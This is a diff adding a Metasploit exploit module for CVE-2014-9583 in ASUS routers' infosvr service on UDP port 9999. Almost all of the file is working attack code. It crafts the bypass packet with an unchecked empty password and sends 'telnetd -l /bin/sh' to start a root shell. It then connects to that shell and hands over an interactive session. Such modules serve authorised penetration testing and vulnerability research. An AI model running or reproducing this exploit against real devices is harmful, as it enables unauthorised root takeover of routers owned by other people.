@@ -1,0 +1,141 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Udp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'ASUS infosvr Auth Bypass Command Execution',
+      'Description' => %q{
+        This module exploits an authentication bypass vulnerability in the
+        infosvr service running on UDP port 9999 on various ASUS routers to
+        execute arbitrary commands as root.
+
+        This module launches the BusyBox Telnet daemon on the port specified
+        in the TelnetPort option to gain an interactive remote shell.
+
+        This module was tested successfully on an ASUS RT-N12E with firmware
+        version 2.0.0.35.
+
+        Numerous ASUS models are reportedly affected, but untested.
+      },
+      'Author'      =>
+        [
+          'Friedrich Postelstorfer', # Initial public disclosure and Python exploit
+          'jduck', # Independent discovery and C exploit
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'unix',
+      'References'  =>
+        [
+          ['CVE', '2014-9583'],
+          ['EDB', '35688'],
+          ['URL', 'https://github.com/jduck/asus-cmd']
+        ],
+      'DisclosureDate' => 'Jan 4 2015',
+      'Privileged'     => true,
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          'Compat' => {
+            'PayloadType'    => 'cmd_interact',
+            'ConnectionType' => 'find'
+          }
+        },
+      'Targets'        => [['Automatic', {}]],
+      'DefaultTarget'  => 0))
+    register_options [
+      Opt::RPORT(9999),
+      OptInt.new('TelnetPort', [true, 'The port for Telnetd to bind', 4444]),
+      OptInt.new('TelnetTimeout', [true, 'The number of seconds to wait for connection to telnet', 10]),
+      OptInt.new('TelnetBannerTimeout', [true, 'The number of seconds to wait for the telnet banner', 25])
+    ]
+    register_advanced_options [
+      # If the session is killed (CTRL+C) rather than exiting cleanly,
+      # the telnet port remains open, but is unresponsive, and prevents
+      # re-exploitation until the device is rebooted.
+      OptString.new('CommandShellCleanupCommand', [true, 'A command to run before the session is closed', 'exit'])
+    ]
+  end
+
+  def telnet_timeout
+    (datastore['TelnetTimeout'] || 10)
+  end
+
+  def telnet_port
+    datastore['TelnetPort']
+  end
+
+  def request(cmd)
+    pkt = ''
+    # ServiceID   [byte]      ; NET_SERVICE_ID_IBOX_INFO
+    pkt << "\x0C"
+    # PacketType  [byte]      ; NET_PACKET_TYPE_CMD
+    pkt << "\x15"
+    # OpCode      [word]      ; NET_CMD_ID_MANU_CMD
+    pkt << "\x33\x00"
+    # Info        [dword]     ; Comment: "Or Transaction ID"
+    pkt << Rex::Text.rand_text_alphanumeric(4)
+    # MacAddress  [byte[6]]   ; Double-wrongly "checked" with memcpy instead of memcmp
+    pkt << Rex::Text.rand_text_alphanumeric(6)
+    # Password    [byte[32]]  ; Not checked at all
+    pkt << "\x00" * 32
+    # Command Length + \x00 + Command padded to 512 bytes
+    pkt << ([cmd.length].pack('C') + "\x00" + cmd).ljust((512 - pkt.length), "\x00")
+  end
+
+  def exploit
+    connect_udp
+    print_status "#{rhost} - Starting telnetd on port #{telnet_port}..."
+    udp_sock.put request "telnetd -l /bin/sh -p #{telnet_port}"
+    disconnect_udp
+
+    vprint_status "#{rhost} - Waiting for telnet service to start on port #{telnet_port}..."
+    Rex.sleep 3
+
+    vprint_status "#{rhost} - Connecting to #{rhost}:#{telnet_port}..."
+
+    sock = Rex::Socket.create_tcp 'PeerHost' => rhost,
+                                  'PeerPort' => telnet_port,
+                                  'Context'  => { 'Msf' => framework, 'MsfExploit' => self },
+                                  'Timeout'  => telnet_timeout
+
+    if sock.nil?
+      fail_with Failure::Unreachable, "Telnet service unreachable on port #{telnet_port}"
+    end
+
+    vprint_status "#{rhost} - Trying to establish a telnet session..."
+
+    prompt = negotiate_telnet sock
+    if prompt.nil?
+      sock.close
+      fail_with Failure::Unknown, 'Unable to establish a telnet session'
+    end
+
+    print_good "#{rhost} - Telnet session successfully established..."
+
+    handler sock
+  end
+
+  def negotiate_telnet(sock)
+    prompt = '#'
+    Timeout.timeout(datastore['TelnetBannerTimeout']) do
+      while true
+        data = sock.get_once(-1, telnet_timeout)
+        if !data or data.length == 0
+          return nil
+        elsif data.include? prompt
+          return true
+        end
+      end
+    end
+  rescue ::Timeout::Error
+    return nil
+  end
+end
